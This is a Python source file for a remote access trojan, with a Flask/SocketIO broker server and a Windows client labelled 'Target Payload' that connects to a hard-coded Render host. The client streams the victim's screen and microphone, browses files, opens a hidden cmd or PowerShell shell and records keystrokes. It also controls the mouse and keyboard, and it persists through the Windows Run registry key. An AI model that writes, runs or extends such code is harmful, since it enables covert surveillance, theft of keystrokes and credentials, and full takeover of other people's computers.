import os
import sys
import time
import base64
import json
import threading
from datetime import datetime
from flask import Flask, render_template, request, send_file
from flask_socketio import SocketIO, emit

# ============================================================
#  Broker Server (Role: Server)
# ============================================================
app = Flask(__name__)
app.config['SECRET_KEY'] = 'sk-hackerai-supersecret'
# Max HTTP Buffer for file uploads (50MB)
socketio = SocketIO(app, cors_allowed_origins="*", max_http_buffer_size=50 * 1024 * 1024)

# Broker State
target_sid = None  # The Windows PC SID
admin_sids = set() # Browser dashboard SIDs

@app.route('/')
def control_room():
    return render_template('control.html')

@app.route('/download')
def download_file():
    # Since the server is a broker, the file is on the Target PC.
    # To download, we fetch the path and tell the target to provide it (via redirect or proxy)
    # For now, let's assume the client will push the file or use a direct route if local.
    # Actually, in a broker setup, the client usually pushes the file to the browser.
    # We'll just return an error and let the frontend handler deal with SocketIO based file delivery if needed.
    return {"error": "Direct download from broker not supported. Use the Files tab."}, 404

@socketio.on('connect')
def handle_connect():
    pass # Wait for register

@socketio.on('disconnect')
def handle_disconnect():
    global target_sid
    sid = request.sid
    if sid == target_sid:
        target_sid = None
        print("❌ Target Windows PC Disconnected")
        socketio.emit('target_status', {'online': False}, broadcast=True)
    elif sid in admin_sids:
        admin_sids.remove(sid)
        print(f"❌ Admin Screen Disconnected ({sid})")

@socketio.on('register')
def handle_register(data):
    global target_sid
    role = data.get('role')
    sid = request.sid
    if role == 'target':
        target_sid = sid
        print(f"🔥 TARGET CONNECTED via Broker: {sid}")
        socketio.emit('target_status', {'online': True}, broadcast=True)
    elif role == 'admin':
        admin_sids.add(sid)
        print(f"👁️ ADMIN CONNECTED: {sid}")
        emit('target_status', {'online': target_sid is not None}, to=sid)

# --- Proxy: ADMIN -> TARGET ---
def forward_to_target(event, data):
    if target_sid:
        socketio.emit(event, data, to=target_sid)
    else:
        emit('server_error', {'error': 'Target PC is offline.'})

ADMIN_EVENTS = [
    'mouse', 'keyboard', 'system', 'terminal_start', 'terminal_input', 'terminal_stop',
    'file_browse', 'file_upload', 'file_delete', 'process_list', 'process_kill',
    'audio_start', 'audio_stop', 'vitals_start', 'vitals_stop', 'monitor_list', 'monitor_switch',
    'keylog_fetch', 'keylog_clear', 'clipboard_get', 'clipboard_set', 'chat_send', 'chat_history', 'alert_send'
]
for ev in ADMIN_EVENTS:
    socketio.on_event(ev, lambda data, e=ev: forward_to_target(e, data))

# --- Proxy: TARGET -> ADMIN ---
def forward_to_admins(event, data):
    for asid in admin_sids:
        socketio.emit(event, data, to=asid)

TARGET_EVENTS = [
    'init', 'screen_frame', 'webcam_frame', 'screenshot', 'terminal_started', 'terminal_output',
    'file_list', 'file_upload_status', 'file_delete_status', 'process_data', 'process_kill_status',
    'audio_started', 'audio_stopped', 'audio_chunk', 'audio_error', 'vitals_update',
    'monitor_data', 'monitor_switched', 'keylog_data', 'keylog_cleared',
    'clipboard_content', 'clipboard_status', 'chat_received', 'chat_data', 'alert_sent'
]
for ev in TARGET_EVENTS:
    socketio.on_event(ev, lambda data, e=ev: forward_to_admins(e, data))

# ============================================================
#  Payload Client (Role: Client)
# ============================================================
def run_client(master_url):
    print(f"🚀 Initializing Client Payload to: {master_url}")
    
    # Dynamic Imports (Avoid crashing Render build)
    try:
        import socketio as client_sio
        import mss
        import cv2
        import numpy as np
        import pyautogui
        import psutil
        import pyperclip
        import winreg
        import ctypes
        from PIL import Image
    except ImportError as e:
        print(f"❌ Missing Client library: {e}")
        print("Install via: pip install -r requirements_client.txt")
        return

    # Optional Client Imports
    try: import sounddevice as sd; AUDIO_READY = True
    except: AUDIO_READY = False
    try: from pynput import keyboard as pynput_keyboard; KEYLOG_READY = True
    except: KEYLOG_READY = False
    try: import GPUtil; GPU_READY = True
    except: GPU_READY = False

    sio = client_sio.Client(logger=False, engineio_logger=False)

    # State
    client_state = {
        'capturing': False,
        'vitals': False,
        'monitor': 1,
        'audio': False,
        'term': {},
        'keylog': []
    }
    keylog_lock = threading.Lock()
    KEYLOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'keylog.json')

    # -- Payload Logic --
    def capture_loop():
        with mss.mss() as sct:
            while client_state['capturing']:
                try:
                    monitor = sct.monitors[client_state['monitor']]
                    raw = sct.grab(monitor)
                    img = Image.frombytes("RGB", raw.size, raw.rgb)
                    frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
                    _, enc = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                    sio.emit('screen_frame', {
                        'image': base64.b64encode(enc).decode('utf-8'),
                        'width': monitor['width'], 'height': monitor['height'], 'timestamp': time.time()
                    })
                    time.sleep(1/25)
                except: time.sleep(0.1)

    @sio.event
    def connect():
        print("🔗 Connected to Master Server!")
        sio.emit('register', {'role': 'target'})
        with mss.mss() as sct:
            sio.emit('init', {
                'screen_size': sct.monitors[client_state['monitor']],
                'status': 'online',
                'audio_available': AUDIO_READY,
                'keylogger_available': KEYLOG_READY,
                'gpu_available': GPU_READY,
                'monitors': len(sct.monitors) - 1
            })
        client_state['capturing'] = True
        threading.Thread(target=capture_loop, daemon=True).start()

    @sio.on('mouse')
    def on_mouse(data):
        if data['type'] == 'move': pyautogui.moveTo(data['x'], data['y'])
        elif data['type'] == 'click': pyautogui.click(button=data.get('button', 'left'))
        elif data['type'] == 'dblclick': pyautogui.doubleClick()
        elif data['type'] == 'rightclick': pyautogui.rightClick()
        elif data['type'] == 'scroll': pyautogui.scroll(data.get('amount', 0))
        elif data['type'] == 'drag': pyautogui.moveTo(data['x1'], data['y1']); pyautogui.dragTo(data['x2'], data['y2'], duration=0)

    @sio.on('keyboard')
    def on_keyboard(data):
        if data['type'] == 'press': pyautogui.press(data['key'])
        elif data['type'] == 'type': threading.Thread(target=pyautogui.typewrite, args=(data['text'],), daemon=True).start()
        elif data['type'] == 'hotkey': pyautogui.hotkey(*data['keys'])

    @sio.on('system')
    def on_system(data):
        if data['cmd'] == 'screenshot':
            with mss.mss() as sct:
                monitor = sct.monitors[client_state['monitor']]
                raw = sct.grab(monitor); img = Image.frombytes("RGB", raw.size, raw.rgb)
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
                _, buffer = cv2.imencode('.png', frame)
                sio.emit('screenshot', {'image': base64.b64encode(buffer).decode()})

    @sio.on('terminal_start')
    def on_terminal_start(data):
        shell = 'powershell.exe' if data.get('shell') == 'powershell' else 'cmd.exe'
        proc = subprocess.Popen(shell, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=0x08000000, bufsize=0)
        client_state['term']['main'] = proc
        def read():
            while proc.poll() is None:
                try:
                    chunk = proc.stdout.read(1024)
                    if chunk: sio.emit('terminal_output', {'output': chunk.decode('utf-8', errors='replace')})
                except: break
            sio.emit('terminal_output', {'output': '\r\n[Terminated]\r\n'})
        threading.Thread(target=read, daemon=True).start()
        sio.emit('terminal_started', {'shell': data.get('shell')})

    @sio.on('terminal_input')
    def on_terminal_input(data):
        if 'main' in client_state['term']:
            p = client_state['term']['main']
            if p.poll() is None: 
                try: p.stdin.write((data['input'] + '\n').encode('utf-8')); p.stdin.flush()
                except: pass

    @sio.on('vitals_start')
    def on_vitals_start(data):
        client_state['vitals'] = True
        def vitals_loop():
            while client_state['vitals']:
                try:
                    mem = psutil.virtual_memory(); disk = psutil.disk_usage('/'); net = psutil.net_io_counters()
                    v = {'cpu': psutil.cpu_percent(), 'cpu_cores': psutil.cpu_percent(percpu=True), 'ram_used': round(mem.used/1e9,2), 'ram_total': round(mem.total/1e9,2), 'ram_percent': mem.percent, 'disk_percent': disk.percent, 'net_sent': round(net.bytes_sent/1e6,1), 'net_recv': round(net.bytes_recv/1e6,1), 'timestamp': time.time()}
                    if GPU_READY:
                        g = GPUtil.getGPUs(); 
                        if g: v.update({'gpu_load': round(g[0].load*100,1), 'gpu_temp': g[0].temperature})
                    sio.emit('vitals_update', v)
                except: pass
                time.sleep(1)
        threading.Thread(target=vitals_loop, daemon=True).start()

    @sio.on('vitals_stop')
    def on_vitals_stop(data): client_state['vitals'] = False

    @sio.on('audio_start')
    def on_audio_start(data):
        if not AUDIO_READY or client_state['audio']: return
        client_state['audio'] = True
        def audio_loop():
            try:
                def cb(indata, frames, time, status):
                    if client_state['audio']: sio.emit('audio_chunk', {'data': base64.b64encode(indata).decode('utf-8')})
                with sd.InputStream(samplerate=16000, blocksize=1024, channels=1, callback=cb):
                    while client_state['audio']: time.sleep(0.1)
            except: client_state['audio'] = False
        threading.Thread(target=audio_loop, daemon=True).start()

    @sio.on('audio_stop')
    def on_audio_stop(data): client_state['audio'] = False

    @sio.on('process_list')
    def on_proc_list(data):
        ps = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
            try: ps.append({'pid': p.info['pid'], 'name': p.info['name'], 'cpu': p.info['cpu_percent'], 'ram': round(p.info['memory_info'].rss/1e6,1)})
            except: pass
        sio.emit('process_data', {'processes': ps[:150]})

    @sio.on('file_browse')
    def on_file_browse(data):
        p = data.get('path', os.path.expanduser('~'))
        try:
            es = []
            for e in os.scandir(p):
                try: es.append({'name': e.name, 'path': e.path.replace('\\','/'), 'is_dir': e.is_dir(), 'size': e.stat().st_size if not e.is_dir() else 0})
                except: pass
            sio.emit('file_list', {'path': p.replace('\\','/'), 'entries': es})
        except Exception as e: sio.emit('file_list', {'error': str(e)})

    # -- Persistence --
    def add_to_startup():
        try:
            key = winreg.HKEY_CURRENT_USER; path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            okey = winreg.OpenKey(key, path, 0, winreg.KEY_ALL_ACCESS)
            exe = sys.executable.replace("python.exe", "pythonw.exe")
            winreg.SetValueEx(okey, "ControlRoomElite", 0, winreg.REG_SZ, f'"{exe}" "{os.path.abspath(__file__)}"')
            winreg.CloseKey(okey)
        except: pass

    # Keylogger
    if KEYLOG_READY:
        def on_p(key):
            try: ks = key.char if hasattr(key, 'char') else str(key).replace('Key.','')
            except: ks = str(key)
            with keylog_lock: 
                client_state['keylog'].append({'key': ks, 'time': time.time()})
                if len(client_state['keylog']) % 20 == 0:
                    with open(KEYLOG_FILE,'w') as f: json.dump(client_state['keylog'], f)
        kl = pynput_keyboard.Listener(on_press=on_p); kl.daemon=True; kl.start()
    
    @sio.on('keylog_fetch')
    def on_k_fetch(data):
        with keylog_lock: sio.emit('keylog_data', {'entries': client_state['keylog'][-300:], 'total': len(client_state['keylog'])})

    add_to_startup()
    while True:
        try: sio.connect(master_url); sio.wait()
        except: time.sleep(5)

# ============================================================
#  Main Logic
# ============================================================
if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", action="store_true", help="Run as Broker Server")
    parser.add_argument("--client", action="store_true", help="Run as Target Payload")
    parser.add_argument("--host", default="https://room-6060.onrender.com", help="Master server URL for client")
    args = parser.parse_args()

    # Auto-detect Render
    is_render = 'RENDER' in os.environ or 'PORT' in os.environ
    
    if args.server or is_render:
        print("⚡ Role: Broker Server (Render Mode)")
        port = int(os.environ.get('PORT', 8080))
        socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
    else:
        print("⚡ Role: Target Payload (Client Mode)")
        try:
            import pyautogui
            pyautogui.FAILSAFE = False
        except: pass
        run_client(args.host)
